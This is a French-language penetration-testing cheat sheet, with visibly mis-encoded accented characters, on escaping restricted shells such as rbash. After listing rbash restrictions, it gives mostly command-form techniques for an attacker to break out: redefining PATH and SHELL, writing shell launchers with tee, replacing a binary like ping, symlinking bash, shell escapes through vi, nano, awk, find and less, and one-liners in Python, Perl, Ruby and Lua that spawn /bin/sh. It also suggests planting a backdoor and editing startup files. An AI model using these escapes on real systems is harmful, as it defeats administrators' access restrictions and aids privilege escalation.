
# √âvasion d‚Äôun Shell Restreint / restricted shell evasion

## Contexte

Certains administrateurs limitent les commandes accessibles aux utilisateurs en leur attribuant un shell restreint (par ex. `rbash`, `rshell`). Si un attaquant obtient l‚Äôacc√®s √† un compte sous ce type de shell, il doit pouvoir s‚Äôen √©chapper pour obtenir davantage de privil√®ges.

## Principes d‚Äôun Shell Restreint

Un shell restreint impose g√©n√©ralement‚ÄØ:

- Interdiction d‚Äôutiliser `cd`.
- Interdiction de modifier ou de d√©finir certaines variables d‚Äôenvironnement (`SHELL`, `PATH`, ‚Ä¶).
- Interdiction d‚Äôex√©cuter des noms de commande contenant `/`.
- Interdiction d‚Äôutiliser `.` avec un chemin contenant `/`.
- Interdiction d‚Äôutiliser l‚Äôoption `-p` de la builtin `hash`.
- Interdiction d‚Äôimporter des fonctions depuis l‚Äôenvironnement.
- Interdiction de lire `SHELLOPTS` au d√©marrage.
- Interdiction de redirections (`>`, `>|`, `>&`, ‚Ä¶).
- Interdiction d‚Äôutiliser `exec` pour remplacer le shell.
- Interdiction d‚Äôajouter/supprimer des built‚Äëins avec `enable -f/-d`.
- Interdiction de d√©sactiver les built‚Äëins d√©sactiv√©s.
- Interdiction de l‚Äôoption `-p` de la builtin `command`.
- Possibilit√© de d√©sactiver le mode restreint avec `set +r` ou `set +o restricted` (si autoris√©).

> Remarque‚ÄØ: Dans la pratique, certaines de ces restrictions peuvent √™tre rel√¢ch√©es.

## üïµÔ∏è‚Äç‚ôÇÔ∏è Reconnaissance

1. Lister les variables d‚Äôenvironnement

```sh
env
export -p# montre les variables export√©es et leurs attributs (lecture‚Äëseule, etc.)
```

2. D√©couvrir les commandes disponibles 

```sh
echo /usr/local/rbin/*# si `ls` n‚Äôest pas autoris√©
```

3. Analyser chaque commande pour identifier d‚Äô√©ventuelles failles d‚Äô√©vasion (ex. `awk`, `find`, `vi`, `less`, ‚Ä¶).

## Manipulation du `PATH` ou de la variable `SHELL`

- Si `PATH` ou `SHELL` sont modifiables, il suffit de les red√©finir‚ÄØ:

```sh
export SHELL=/bin/bash
export PATH=$HOME/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

- Une fois le `PATH` pointant vers un r√©pertoire o√π vous pouvez placer vos propres scripts, vous pouvez y d√©poser une backdoor.

---

## Copie de fichiers

- √âcrire dans votre `$HOME` via `tee` (utile quand `>` est bloqu√©)‚ÄØ:

```sh
echo '#!/bin/bash' | tee ~/mysh
echo 'exec /bin/bash' | tee -a ~/mysh
chmod +x ~/mysh
```

- √âcraser un binaire pr√©sent dans `$PATH` (ex. `ping`)‚ÄØ:

```sh
echo -e '#!/bin/bash\n/bin/bash' | tee ~/bin/ping
chmod +x ~/bin/ping
ping# lance alors votre shell
```

- Cr√©er un lien symbolique dans un r√©pertoire accessible‚ÄØ:

```sh
ln -s /bin/bash $HOME/bin/bashlink
```

## √âvasion via des √©diteurs

| √âditeur | M√©thode |
|---------|-------|
| `vi` / `vim` | `:set shell=/bin/bash` ‚Üí `:shell` <br>ou `:! /bin/bash` |
| `rvi` / `rvim` (versions restreintes) | Souvent bloqu√©, mais essayer diff√©rentes variantes (`:!bash`, `:!sh`). |
| `nano` | `Ctrl+R` puis `! /bin/bash` (selon la version). |


## √âvasion via des commandes int√©gr√©es

- `awk`

```sh
awk 'BEGIN {system("/bin/sh")}'
```

- `find` (avec `-exec`)

```sh
find / -name dummy -exec awk 'BEGIN {system("/bin/sh")}' \;
```

- `more` / `less` / `man`

Ouvrez un fichier, puis tapez‚ÄØ:

```sh
! /bin/sh
```

- `tee` (d√©j√† vu plus haut) pour cr√©er/modifier des scripts.

## √âvasion via des langages de script

```sh
python -c 'import os; os.system("/bin/sh")'
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
lua -e 'os.execute("/bin/sh")'
```

## Fichiers ex√©cut√©s en mode non restreint

Certains shells ex√©cutent des fichiers de d√©marrage (.bashrc, .profile) avant d‚Äôappliquer les restrictions.

Si vous avez la possibilit√© de modifier ces fichiers, ins√©rez‚ÄØ:

```sh
export SHELL=/bin/bash
```

Supprimez‚Äëles puis reconnectez‚Äëvous pour forcer le rechargement.
